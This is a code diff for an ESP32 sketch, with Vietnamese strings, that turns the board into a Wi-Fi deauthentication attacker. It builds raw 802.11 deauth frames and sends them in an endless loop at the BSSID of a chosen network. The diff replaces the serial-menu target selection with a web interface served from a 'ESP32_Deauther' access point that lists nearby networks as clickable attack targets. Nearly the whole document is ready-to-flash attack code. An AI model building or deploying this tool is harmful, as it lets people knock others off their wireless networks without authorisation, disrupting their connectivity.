@@ -1,57 +1,59 @@
 #include "WiFi.h"
 #include "esp_wifi.h"
+#include "ESPAsyncWebServer.h"
 
-// Hàm gửi gói deauth
+AsyncWebServer server(80);
+
+String networksHTML;
+
 void sendDeauth(uint8_t *mac, uint8_t channel) {
   uint8_t packet[26] = {
-    0xC0, 0x00, 0x3A, 0x01,              // Frame Control + Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Đích: broadcast
-    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],  // Nguồn (BSSID)
-    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],  // BSSID
-    0x00, 0x00,                          // Seq num
-    0x07, 0x00                           // Reason code
+    0xC0, 0x00, 0x3A, 0x01,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
+    0x00, 0x00,
+    0x07, 0x00
   };
-
   esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
   esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
 }
 
+void scanNetworks() {
+  networksHTML = "<h2>Chon mang de deauth</h2>";
+  int n = WiFi.scanNetworks();
+  for (int i = 0; i < n; i++) {
+    networksHTML += "<p><a href=\"/deauth?mac=" + WiFi.BSSIDstr(i) + "&ch=" + String(WiFi.channel(i)) + "\">"
+                  + WiFi.SSID(i) + " (" + WiFi.BSSIDstr(i) + ")</a></p>";
+  }
+}
+
 void setup() {
   Serial.begin(115200);
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAP("ESP32_Deauther", "12345678");
 
-  Serial.println("Dang quet cac mang Wi-Fi...");
-  int n = WiFi.scanNetworks();
-  if (n == 0) {
-    Serial.println("Khong tim thay mang nao!");
-    return;
-  }
+  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
+    scanNetworks();
+    request->send(200, "text/html", networksHTML);
+  });
 
-  for (int i = 0; i < n; ++i) {
-    Serial.printf("[%d] %s (MAC: %s, Kenh: %d)\n", i, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
-  }
-
-  Serial.println("\nNhap so thu tu mang can deauth: ");
-  while (!Serial.available()) {}
-  int choice = Serial.parseInt();
-
-  if (choice >= 0 && choice < n) {
-    uint8_t target_mac[6];
-    sscanf(WiFi.BSSIDstr(choice).c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-           &target_mac[0], &target_mac[1], &target_mac[2],
-           &target_mac[3], &target_mac[4], &target_mac[5]);
-
-    int ch = WiFi.channel(choice);
-    Serial.printf("Dang gui deauth toi %s tren kenh %d...\n", WiFi.SSID(choice).c_str(), ch);
-
-    while (true) {
-      sendDeauth(target_mac, ch);
-      delay(1); // Gửi rất nhanh
+  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
+    if (request->hasParam("mac") && request->hasParam("ch")) {
+      String macStr = request->getParam("mac")->value();
+      int ch = request->getParam("ch")->value().toInt();
+      uint8_t target_mac[6];
+      sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+             &target_mac[0], &target_mac[1], &target_mac[2],
+             &target_mac[3], &target_mac[4], &target_mac[5]);
+      request->send(200, "text/html", "Dang deauth " + macStr);
+      while (true) sendDeauth(target_mac, ch);
+    } else {
+      request->send(400, "text/plain", "Thieu tham so");
     }
-  } else {
-    Serial.println("Lua chon khong hop le!");
-  }
+  });
+
+  server.begin();
 }
 
 void loop() {}
